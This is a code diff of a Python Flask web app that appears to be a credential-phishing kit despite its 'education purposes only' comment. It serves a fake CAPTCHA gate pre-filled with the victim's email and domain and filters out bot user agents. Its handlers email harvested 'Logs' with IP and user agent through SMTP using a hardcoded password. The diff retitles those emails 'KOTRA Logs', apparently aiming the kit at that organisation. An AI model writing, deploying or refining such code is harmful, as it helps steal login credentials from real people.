@@ -10,6 +10,8 @@ import smtplib
 import ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from io import BytesIO
+from PIL import Image, ImageDraw, ImageFont
 
 # made for education purposes only
 
@@ -85,95 +87,68 @@ bot_user_agents = [
 
 @app.route('/', methods=['GET', 'POST'])
 def captcha():
-
     if request.method == 'GET':
+        # Check if the user already passed the CAPTCHA
+        if session.get('passed_captcha'):
+            return redirect(url_for('success', web=session.get('eman')))
 
-        if 'passed_captcha' in session and session['passed_captcha']:
-
-            # CAPTCHA has already been passed, redirect to success page
-
-            return redirect(url_for('success'))
-
-        # Generate a random 4-digit code
-
+        # Generate a random 4-digit CAPTCHA code
         code = random.randint(1000, 9999)
-        colors = [
-            '#FF4136',
-            '#0074D9',
-            '#2ECC40',
-            '#FFDC00',
-            '#FF851B',
-            '#B10DC9',
-            ]
+        colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
         color = random.choice(colors)
         session['code'] = str(code)
-        userauto = request.args.get('web')
-        userdomain = userauto[userauto.index('@') + 1:]
+
+        # Handle 'web' parameter safely
+        userauto = request.args.get('web', 'default@example.com')
+        userdomain = userauto.split('@')[-1] if '@' in userauto else 'unknown'
+
+        # Store data in session
         session['eman'] = userauto
         session['ins'] = userdomain
-        return render_template(
-            'captcha.html',
-            code=code,
-            color=color,
-            eman=userauto,
-            ins=userdomain,
-            error=False,
-            )
-    elif request.method != 'GET':
 
-        user_input = request.form['code']
+        # Render the CAPTCHA template
+        return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)
 
-        if user_input == session['code']:
+    elif request.method == 'POST':
+        # Retrieve the code entered by the user
+        user_input = request.form.get('code')
 
-            # User input matches the code, set the flag and redirect to success page
-
+        # Check if the entered code matches the stored CAPTCHA code
+        if user_input == session.get('code'):
             session['passed_captcha'] = True
-            return redirect(url_for('success'))
+            return redirect(url_for('success', web=session.get('eman')))
         else:
-
-            # User input does not match the code, generate a new code and render the CAPTCHA page with an error message
-
+            # Generate a new CAPTCHA code on failure
             code = random.randint(1000, 9999)
-            colors = [
-                '#FF4136',
-                '#0074D9',
-                '#2ECC40',
-                '#FFDC00',
-                '#FF851B',
-                '#B10DC9',
-                ]
-            color = random.choice(colors)
+            color = random.choice(['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9'])
             session['code'] = str(code)
 
-            return render_template('captcha.html', code=code,
-                                   color=color, error=True)
-
+            # Reuse the session values to avoid inconsistency
+            return render_template(
+                'captcha.html', 
+                code=code, 
+                color=color, 
+                eman=session['eman'], 
+                ins=session['ins'], 
+                error=True
+            )
 
 @app.route('/success')
 def success():
-    if 'passed_captcha' in session and session['passed_captcha']:
-        web_param = request.args.get('web')
-        return redirect(url_for('route2', web=web_param))
-    else:
-        return redirect(url_for('captcha'))
+    web_param = request.args.get('web', 'No web param')
+    return redirect(url_for('route2', web=web_param))
 
-
-@app.route('/m')
+@app.route("/route2")
 def route2():
     web_param = request.args.get('web')
     if web_param:
         session['eman'] = web_param
         session['ins'] = web_param[web_param.index('@') + 1:]
-    return render_template('index.html', eman=session.get('eman'),
-                           ins=session.get('ins'))
+    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
 @app.route('/first', methods=['POST'])
 def first():
-    web_param = request.args.get('web')
-    if web_param:
-        session['eman'] = web_param
-        session['ins'] = web_param[web_param.index('@') + 1:]
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
@@ -190,7 +165,7 @@ def first():
         password = 'vip6ebdd04ea6df'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
-        message['Subject'] = 'GENERAL Logs !'
+        message['Subject'] = 'KOTRA Logs !'
         message['From'] = sender_email
         message['To'] = receiver_email
         text = \
@@ -231,7 +206,7 @@ def second():
         password = 'vip6ebdd04ea6df'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
-        message['Subject'] = 'GENERAL logs !! '
+        message['Subject'] = 'KOTRA logs !! '
         message['From'] = sender_email
         message['To'] = receiver_email
         text = \
